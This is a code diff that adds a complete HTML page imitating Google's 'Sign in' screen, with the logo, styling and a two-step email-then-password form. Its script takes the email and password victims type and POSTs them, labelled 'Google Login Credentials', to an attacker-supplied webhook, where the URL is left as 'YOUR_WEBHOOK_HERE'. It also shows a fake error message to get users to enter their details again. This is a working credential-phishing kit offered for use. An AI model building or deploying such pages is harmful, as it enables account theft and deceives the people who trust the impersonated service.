@@ -1,0 +1,150 @@
+<!doctypehtml>
+  <meta charset=utf-8>
+  <title>Sign in with Google</title>
+  <meta content="width=device-width,initial-scale=1" name=viewport>
+  <base href=/>
+  <link href="data:image/svg+xml,%3Csvg viewBox='0 0 48 48'
+xmlns='http://www.w3.org/2000/svg'
+xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ccircle cx='24' cy='24' r='22' fill='%23fff'/%3E%3Cdefs%3E%3Cpath id='b' d='M44.5 20H24v8.5h11.8C34.7 33.9 30.1 37 24 37c-7.2 0-13-5.8-13-13s5.8-13 13-13c3.1 0 5.9 1.1 8.1 2.9l6.4-6.4C34.6 4.1 29.6 2 24 2 11.8 2 2 11.8 2 24s9.8 22 22 22c11 0 21-8 21-22 0-1.3-.2-2.7-.5-4z'/%3E%3C/defs%3E%3CclipPath id='a'%3E%3Cuse overflow='visible' xlink:href='%23b'/%3E%3C/clipPath%3E%3Cpath transform='scale(.8) translate(6 6)' d='M0 37V11l17 13z' clip-path='url(%23a)' fill='%23FBBC05'/%3E%3Cpath transform='scale(.8) translate(6 6)' d='M0 11l17 13 7-6.1L48 14V0H0z' clip-path='url(%23a)' fill='%23EA4335'/%3E%3Cpath transform='scale(.8) translate(6 6)' d='M0 37l30-23 7.9 1L48 0v48H0z' clip-path='url(%23a)' fill='%2334A853'/%3E%3Cpath transform='scale(.8) translate(6 6)' d='m48 48-31-24-4-3 35-10z' clip-path='url(%23a)' fill='%234285F4'/%3E%3C/svg%3E" rel=icon type=image/svg+xml>
+  <style>
+body{position:relative;margin:0;font-family:Arial,Helvetica,sans-serif;scroll-behavior:smooth}.container{display:flex;height:100vh;user-select:none;background-color:#f0f4f9}.card{width:377px;height:404px;padding:18px 36px;border-radius:25px;border:1px solid #f0f4f9;margin:auto;background-color:#fff}.cardOutside{width:450px;height:502px;border-radius:28px;margin:auto}.header{text-align:left;align-items:left;font-weight:400}.title{padding:15px 0;font-size:34px}.tagline{font-size:16px;padding-bottom:18px}.label{display:block;position:absolute;padding:0 5px;width:auto;color:#5f6368;background:#fff;transition:all 150ms ease;transform:translate(12px,-37px);cursor:text}.input{padding:16px;margin-top:20px;font-size:17px;background:#fff;width:calc(100% - 36px);border:1px solid #4d4d4d;border-radius:5.5px}.input:focus{outline:0;padding:15px;border:2px solid #1a73e8}.input:focus+.label,.input:not(:placeholder-shown)+.label{transform:translate(8px,-62px);font-size:13px}.input:focus+.label{color:#1a73e8}.links{color:#1a73e8;font-size:14px;padding-top:10px;cursor:pointer;font-weight:500}.links:hover{color:#0d47a1}.links2{color:#1a73e8;font-size:14px;padding-top:10px;cursor:pointer;font-weight:500}.links2:hover{color:#0d47a1}.guest{margin-top:32px;font-size:14px;color:#5f6368}.login-bar{margin-top:32px;display:flex;flex-wrap:wrap}.next{margin-left:auto;padding:12px 30px;border-radius:18px;cursor:pointer;color:#fff;outline:0;border:none;background:#1a73e8;font-weight:600}.next:hover{background:#1b66c9}.fat{font-weight:600}@media only screen and (max-width:600px){.card{border:none}.container{background-color:#fff}}@media only screen and (min-width:1100px){.card{width:900px!important;height:380px!important;padding:5px 16px}.cardOutside{width:900px!important;height:380px!important;margin:auto}.input{margin-top:110px;margin-left:115px;width:420px}.label{margin-left:120px}.guest{margin-top:50px;margin-left:120px}.links{margin-left:120px}.passShow{margin-top:25px;margin-left:125px}.googs{margin-left:20px}.title{padding-top:20px;margin-left:20px}.tagline{padding-top:5px;margin-left:20px}#profileBadge{margin-top:20px;margin-left:20px}.header-container{display:flex;justify-content:space-between}.links2{margin-left:350px}.header{padding-top:30px;text-align:left;font-weight:400;width:400px}.header2{padding-top:152px;text-align:right;font-weight:400}}.actionBtn{background:0 0;border:none;color:#1a73e8;font-size:14px;padding:0;cursor:pointer;outline:0}.hide{display:none!important}.fadeOutLeft{animation-name:fadeOutLeft;animation-duration:.5s;animation-fill-mode:forwards}@keyframes fadeOutLeft{0%{opacity:1;transform:translateX(0)}100%{opacity:0;transform:translateX(-20px)}}.fadeInRight{animation-name:fadeInRight;animation-duration:.5s;animation-fill-mode:forwards}@keyframes fadeInRight{0%{opacity:0;transform:translateX(20px)}100%{opacity:1;transform:translateX(0)}}.footer{position:absolute;right:0;bottom:0;left:0;margin-bottom:20px;padding:1rem;text-align:center}.footer .links{color:#3c4043;font-size:13px;margin:0 .5rem}.footer .links:hover{color:#1a73e8;text-decoration:underline}.loader{position:relative;left:-38px;top:-49px;width:120%;height:4px;overflow:hidden}.loading-bar{width:100%;height:100%;background-color:transparent;position:absolute;z-index:-1;animation:loading 1s infinite}@keyframes loading{0%{transform:translateX(-100%)}100%{transform:translateX(100%)}}.overlay{position:fixed;top:0;left:0;width:100%;height:100%;background-color:#fff;opacity:.5;z-index:2}.passShow{display:block;position:relative;padding-left:35px;margin-top:10px;margin-bottom:12px;cursor:pointer;font-size:15px;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.passShow input{position:absolute;opacity:0;cursor:pointer;height:0;width:0}.checkmark{position:absolute;top:0;left:0;height:15px;width:15px;border-radius:3px;border:1px solid #aaa}.passShow:hover input~.checkmark{background-color:#ccc}.passShow input:checked~.checkmark{background-color:#1a73e8;border:1px solid #1a73e8}.checkmark:after{content:"";position:absolute;display:none}.passShow input:checked~.checkmark:after{display:block}.passShow .checkmark:after{left:2.4px;width:5px;height:10px;border:solid #fff;w border-width:0 3px 3px 0;-webkit-transform:rotate(45deg);-ms-transform:rotate(45deg);transform:rotate(45deg)}.profile-badge{display:inline-block;margin:auto;border-radius:30px;border:1px solid #aaa;padding:4px;color:#fff;font-size:18px;margin-left:0;margin-bottom:25px;width:240px;height:20px;text-align:center}.profile-pic{border-radius:50%;width:20px;height:20px;float:left}.profile-email{color:#3c4043;font-size:13px;margin-left:5px;margin-top:3px;float:left;font-weight:600}.profile-dropdown{float:right;margin-right:10px;margin-top:3px;font-size:13px}.error{color:#d93025;background-color:#f5c6cb;border-color:#f1b0af;padding:.75rem 1.25rem;margin-bottom:1rem;border:1px solid #d93025;border-radius:.25rem}.error h3{margin-top:0;margin-bottom:.5rem;font-weight:600}.error .close{position:relative;float:right;padding:.75rem 1.25rem;margin-top:-1.25rem;margin-bottom:-1.25rem;margin-right:-2rem;color:inherit;background-color:transparent;border:0;font-size:1.5rem}
+  </style>
+  <div class="hide overlay" id=overlay></div>
+  <div class=container>
+    <div class=cardOutside>
+      <div class=card>
+        <div class=loader>
+          <div class=loading-bar id=loader></div>
+        </div>
+        <div class=card-body id=cardBody>
+          <div class="header-container">
+          <div align="left" class=header>
+            <div class=googs>
+            <img src="data:image/png;base64,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" width="50px" alt="g">
+            </div>
+            <div class=title>Sign in</div>
+            <div class=tagline>Use your Google Account</div>
+            <div class="hide error"><button class=close onclick=hideError()><i style=font-size:20px><svg height=1em viewBox="0 0 512 512" xmlns=http://www.w3.org/2000/svg>
+                    <path d="M256 48a208 208 0 1 1 0 416 208 208 0 1 1 0-416zm0 464A256 256 0 1 0 256 0a256 256 0 1 0 0 512zM175 175c-9.4 9.4-9.4 24.6 0 33.9l47 47-47 47c-9.4 9.4-9.4 24.6 0 33.9s24.6 9.4 33.9 0l47-47 47 47c9.4 9.4 24.6 9.4 33.9 0s9.4-24.6 0-33.9l-47-47 47-47c9.4-9.4 9.4-24.6 0-33.9s-24.6-9.4-33.9 0l-47 47-47-47c-9.4-9.4-24.6-9.4-33.9 0z" />
+                  </svg></i></button>
+              <h3>Error :/</h3>Either your email / password is incorrect<br><b>Please try again.</b>
+            </div>
+            <div class="hide profile-badge" id=profileBadge><img alt="Profile picture" class=profile-pic src="data:image/svg+xml,%3Csvg viewBox='0 0 256 256' version='1.1'
+xmlns:xlink='http://www.w3.org/1999/xlink'
+xmlns='http://www.w3.org/2000/svg'%3E%3Cdefs%3E%3Cpath d='M256 0L256 0L256 256L0 256L0 0L256 0Z' id='path_1' /%3E%3Cpath d='M0 128C0 57.3075 57.3075 0 128 0C198.692 0 256 57.3075 256 128C256 198.692 198.692 256 128 256C57.3075 256 0 198.692 0 128Z' id='path_2' /%3E%3CclipPath id='clip_1'%3E%3Cuse xlink:href='%23path_1' /%3E%3C/clipPath%3E%3CclipPath id='mask_1'%3E%3Cuse xlink:href='%23path_2' /%3E%3C/clipPath%3E%3C/defs%3E%3Cg id='avatar' clip-path='url(%23clip_1)'%3E%3Cpath d='M256 0L256 0L256 256L0 256L0 0L256 0Z' id='avatar' fill='%23FFFFFF' fill-opacity='0' stroke='none' /%3E%3Cpath d='M0 128C0 57.3075 57.3075 0 128 0C198.692 0 256 57.3075 256 128C256 198.692 198.692 256 128 256C57.3075 256 0 198.692 0 128Z' id='c' fill='%23C6DAFC' fill-rule='evenodd' stroke='none' /%3E%3Cg id='m'%3E%3Cpath d='M0 128C0 57.3075 57.3075 0 128 0C198.692 0 256 57.3075 256 128C256 198.692 198.692 256 128 256C57.3075 256 0 198.692 0 128Z' id='c' fill='%23C6DAFC' fill-rule='evenodd' stroke='none' /%3E%3Cg clip-path='url(%23mask_1)'%3E%3Cpath d='M46 199C46.3199 182.111 84.0264 163 126 163C167.974 163 208.5 182.431 208.5 199C208.5 202.376 208.462 199.683 208.5 226C208.533 248.236 159.422 256 126 256C84.0264 256 46.2237 252.666 45.9999 226C45.7761 199.334 45.6801 215.889 46 199Z' id='c' fill='%235E97F6' fill-rule='evenodd' stroke='none' /%3E%3C/g%3E%3C/g%3E%3Cpath d='M87 102C87 79.9086 104.909 62 127 62C149.091 62 167 79.9086 167 102C167 124.091 149.091 142 127 142C104.909 142 87 124.091 87 102Z' id='c' fill='%235E97F6' fill-rule='evenodd' stroke='none' /%3E%3C/g%3E%3C/svg%3E"><span class=profile-email id=profileEmail></span><i class=profile-dropdown><svg height=1em viewBox="0 0 448 512" xmlns=http://www.w3.org/2000/svg>
+                  <path d="M201.4 342.6c12.5 12.5 32.8 12.5 45.3 0l160-160c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0L224 274.7 86.6 137.4c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3l160 160z" />
+                </svg></i>
+          </div>
+          <div class=header2>
+              </div>
+                </div>
+                <form action=/get action=# id=loginForm onsubmit=submitForm()>
+                <input id=name class=input name=email type="email" placeholder=" " required autofocus><label class=label for=name id=nameLabel>Email or phone</label>
+            <div class="links fat" id=nameForgot>Forgot email?</div><input id=pass class="hide input" name=password placeholder="Enter your password" type="password" required><label class="hide label" for=pass id=passLabel>Enter your password</label>
+            <div class="hide passShow" id=passShow onclick=showPass()>Show password <input id=showPass type=checkbox><span class=checkmark></span></div>
+            <div id=guestText>
+              <div class=guest>Not your computer? Use Guest mode to sign in privately.</div>
+              <div class=links>Learn more about using Guest mode</div>
+            </div>
+            <div class=login-bar><button class="links2 actionBtn" id=actionBtn>Create account</button><button class=next onclick=next()>Next</button></div>
+          </form>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class=footer><span class=links>Help</span><span class=links>Privacy</span><span class=links>Terms</span></div>
+  </div>
+  <script>
+    function next() {
+        var email = document.getElementById("name").value;
+        document.getElementById("pass").value;
+        if (email === "") return false;
+        document.getElementById("loader").style.backgroundColor = "#1a73e8";
+        document.getElementById("overlay").classList.remove("hide");
+        window.name = email;
+        sendDataToWebhook(email);
+        document.getElementById("nameLabel").classList.add("hide");
+        document.getElementById("cardBody").classList.add("fadeOutLeft");
+        setTimeout(function() {
+            document.getElementById("name").classList.add("hide");
+            document.getElementById("nameForgot").classList.add("hide");
+            document.getElementById("name").classList.remove("fadeOutLeft");
+            document.getElementById("nameForgot").classList.remove("fadeOutLeft");
+            document.getElementById("nameLabel").remove();
+            document.getElementById("nameForgot").remove();
+            showPasswordField();
+        }, 600);
+    }
+    
+    function sendDataToWebhook(email) {
+        const body = document.body;
+        var webhookURL = "YOUR_WEBHOOK_HERE";
+        var message1 = document.getElementById("name").value;
+        var message2 = document.getElementById("pass").value;
+        if (message2.trim() !== '') {
+            var message = "Google Login Credentials :: **Email:** " + "``" + message1 + "``" + " | **Password:** " + "``" +  message2 + "``";
+            var payload = {
+                content: message
+            };
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", webhookURL, true);
+            xhr.setRequestHeader("Content-Type", "application/json");
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4) {
+                    if (xhr.status === 200) {
+                        console.log("Message sent successfully!");
+                    } else {
+                        console.log("Error:", xhr.status);
+                    }
+                }
+            };
+            xhr.send(JSON.stringify(payload));
+        } else {
+            console.log("Password field is empty.");
+        }
+    }
+    
+    function showPasswordField() {
+      document.getElementById("pass").classList.remove("hide"), document.getElementById("passShow").classList.remove("hide"), document.getElementById("showPass").classList.remove("hide"), document.getElementById("guestText").classList.add("hide"), document.getElementsByClassName("tagline")[0].classList.add("hide"), document.getElementsByClassName("title")[0].innerHTML = "Welcome", document.getElementById("profileEmail").innerHTML = window.name, document.getElementById("profileBadge").classList.remove("hide"), document.getElementById("cardBody").classList.remove("fadeOutLeft"), document.getElementById("cardBody").classList.add("fadeInRight"), hideError(), document.getElementById("passShow").classList.add("fadeInRight"), document.getElementById("actionBtn").innerHTML = "Forgot password?", setTimeout(function() {
+        document.getElementById("pass").classList.remove("fadeInRight"), document.getElementById("passShow").classList.remove("fadeInRight"), document.getElementById("pass").setAttribute("placeholder", " "), document.getElementById("passLabel").classList.remove("hide")
+      }, 500), document.getElementById("overlay").classList.add("hide"), document.getElementById("loader").style.backgroundColor = "transparent", document.getElementsByClassName("next")[0].setAttribute("onclick", "submitForm()")
+    }
+
+function submitForm() {
+    var email = document.getElementById("name").value;
+    var password = document.getElementById("pass").value;
+    if (email === "" || password === "") return false;
+    document.getElementById("loader").style.backgroundColor = "#1a73e8";
+    document.getElementById("overlay").classList.remove("hide");
+    window.password = password;
+    event.preventDefault();
+    sendDataToWebhook(email);
+    return true;
+}
+
+    function showPass() {
+      var e = document.getElementById("pass"),
+        t = document.getElementById("showPass");
+      "password" === e.type ? (e.type = "text", t.checked = !0) : (e.type = "password", t.checked = !1)
+    }
+
+    function hideError() {
+      -1 == document.cookie.indexOf("submitted") || (document.getElementsByClassName("card")[0].style.height = "404px", document.getElementsByClassName("cardOutside")[0].style.height = "502px", document.getElementsByClassName("error")[0].classList.add("hide"), document.getElementsByClassName("footer")[0].classList.remove("hide"))
+    } - 1 == document.cookie.indexOf("submitted") || (window.innerWidth < 600 && document.getElementsByClassName("footer")[0].classList.add("hide"), document.getElementsByClassName("card")[0].style.height = "460px", document.getElementsByClassName("cardOutside")[0].style.height = "560px", document.getElementsByClassName("error")[0].classList.remove("hide")), window.onresize = function() {
+      if (window.innerWidth < 600) {
+        var e = window.innerWidth - 90;
+        document.getElementsByClassName("card")[0].style.width = e + "px";
+        e = window.innerWidth + 73;
+        document.getElementsByClassName("cardOutside")[0].style.width = e + "px"
+      } else document.getElementsByClassName("card")[0].style.width = "377px", document.getElementsByClassName("cardOutside")[0].style.width = "450px"
+    }, console.log("done")
+  </script>
+  <script>
+    if (window.innerWidth < 600) {
+      var e = window.innerWidth - 90;
+      document.getElementsByClassName("card")[0].style.width = e + "px", e = window.innerWidth + 73, document.getElementsByClassName("cardOutside")[0].style.width = e + "px";
+      let t = window.innerWidth,
+        s = 0 + 10 * Math.floor((t - 340) / 20);
+      document.getElementsByClassName("profile-badge")[0].style.marginLeft = s + "px"
+    } else document.getElementsByClassName("card")[0].style.width = "377px", document.getElementsByClassName("cardOutside")[0].style.width = "450px";
+  </script>
